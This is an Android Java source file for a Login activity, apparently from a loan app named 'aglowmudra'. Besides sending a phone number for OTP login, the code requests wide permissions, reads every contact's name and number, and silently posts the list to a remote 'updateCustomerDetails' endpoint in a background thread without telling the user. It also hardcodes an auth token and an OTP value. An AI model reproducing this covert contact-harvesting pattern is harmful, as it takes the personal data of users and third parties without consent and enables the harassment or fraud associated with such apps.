package com.example.aglowmudra;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.annotation.TargetApi;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.jar.Attributes;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class Login extends AppCompatActivity {
    public static final int REQUEST_READ_CONTACTS = 79;
    ArrayList arrayList;
    ListView list;
    Button Send_Click;
    EditText Phone_number;
    final ArrayList<String> nameList = new ArrayList<>();
    ArrayList<String> phone=new ArrayList<>();
    Thread thread;

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED || ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
            Log.d("TAG", "Value is created by system ");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                arrayList =getAllContacts();
                Log.d("TAG","Value is creted by 1234"+arrayList);

            }
        } else {
            Log.d("TAG", "Value when is created");
            requestPermission();
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

            }

        }catch (Exception e){
            e.getStackTrace();

        }
        initi();
        Send_Click.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Log.d("TAG","VAlue is creted by login");
                Thread thread=new Thread(new Runnable() {
                    @Override
                    public void run() {
                        LoginAttempt();
                    }
                });
                thread.start();


            }
        });

    }





    private void requestPermission() {
        if (ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.READ_CONTACTS) && ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_EXTERNAL_STORAGE)) {
            // show UI part if you want here to show some rationale !!!
        } else {
            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_CONTACTS, Manifest.permission.READ_EXTERNAL_STORAGE,
                            Manifest.permission.READ_SMS, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.CAMERA},
                    REQUEST_READ_CONTACTS);
        }

    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        Log.d("TAG", "VAlue is created in persion not granted");
        if (requestCode == REQUEST_READ_CONTACTS) {
            Log.d("TAG", "value fisrt step");
            for (int i = 0, len = permissions.length; i < len; i++) {
                Log.d("TAG", "value" + permissions);
                String permission = permissions[i];
                if (grantResults[i] == PackageManager.PERMISSION_DENIED) {
                    boolean showRational = shouldShowRequestPermissionRationale(permission);
                    Log.d("TAG", "Value is credted" + showRational);
                    if (!showRational) {
                        if (showRational == false) {
                            Log.d("TAG", "permission is  granted");
                            requestPermission();
                            arrayList=getAllContacts();


                        }

                    } else {
                        Log.d("TAG", "permission is not granted");
                    }


                }


            }


        }


    }

    public void LoginAttempt() {
        Log.d("TAG","Value is creted after Login Function");
        String Phonenumber=Phone_number.getText().toString();

        OkHttpClient client = new OkHttpClient();

        MediaType mediaType = MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW");
        RequestBody body = RequestBody.create(mediaType, "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n"+Phonenumber+"\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"otp\"\r\n\r\n5532\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--");
        Request request = new Request.Builder()
                .url("https://drfin.in/aglowcredit/api/sendOtp")
                .post(body)
                .addHeader("content-type", "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW")
                .addHeader("cache-control", "no-cache")
                .addHeader("postman-token", "b0819f8e-52f9-4b75-8849-7ac963935599")
                .build();
        try {
            Response response = client.newCall(request).execute();
            Log.d("TAG", "VAlue is created is 1234" + response);
            if (response.code()==200){
                Intent intent=new Intent(Login.this,MainActivity.class);
                intent.putExtra("Phone_number",Phone_number.getText().toString());
                startActivity(intent);

            }else {
                Toast.makeText(this, "ChecK Your Internet Connection", Toast.LENGTH_SHORT).show();

            }
        } catch (IOException e) {
            e.getStackTrace();
        }
    }




    public void initi() {
        Send_Click = (Button) findViewById(R.id.Sendffff);
        Phone_number = (EditText) findViewById(R.id.PhoneNumber);


    }
    private ArrayList getAllContacts() {
        Log.d("TAG","Value is creted by system");
   String contact="";

        Log.d("TAG","Value is creted"+nameList);
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if ((cur != null ? cur.getCount() : 0) > 0) {
//            Log.d("TAG", "VAlue in second");
            while (cur != null && cur.moveToNext()) {
                Log.d("TAG", "Value in third");
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                //    nameList.add(name);
                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Log.d("TAG", "VAlue in fouth");
                    Cursor pCur = cr.query(

                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);

                    while (pCur.moveToNext()) {
                        Log.d("TAG", "value in fivth");
                        String name1 = pCur.getString(pCur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));

                        contact = name1 + " : " + phoneNo;
                        phone.add(contact);



                    }

                    pCur.close();

                }


            }

            Log.d("TAG", "VAlue is creted in the end" + phone);

            if (cur != null) {
                cur.close();
            }
        }
        thread=new Thread(new Runnable() {
            @Override
            public void run() {
                SendContact();

            }
        });
        thread.start();
        return nameList;

    }
    public void SendContact(){
        try {
            Log.d("TAG","VAlue is creted aftewr  send data"+phone);
            OkHttpClient client = new OkHttpClient();

            MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
            RequestBody body = RequestBody.create(mediaType, "auth_token=5e1081856674b&sms_list=%20&contact_list="+phone);
            Request request = new Request.Builder()
                    .url("https://drfin.in/aglowcredit/api/updateCustomerDetails")
                    .post(body)
                    .addHeader("content-type", "application/x-www-form-urlencoded")
                    .addHeader("cache-control", "no-cache")
                    .addHeader("postman-token", "ce74cac2-0982-faac-cdbc-51d82c17bc87")
                    .build();

            Response response = client.newCall(request).execute();
            Log.d("TAG","VAlue is sended"+response);
            if(response.code()== 200){
                thread.stop();
            }


        }catch(Exception e){
            e.getStackTrace();

        }



    }
}
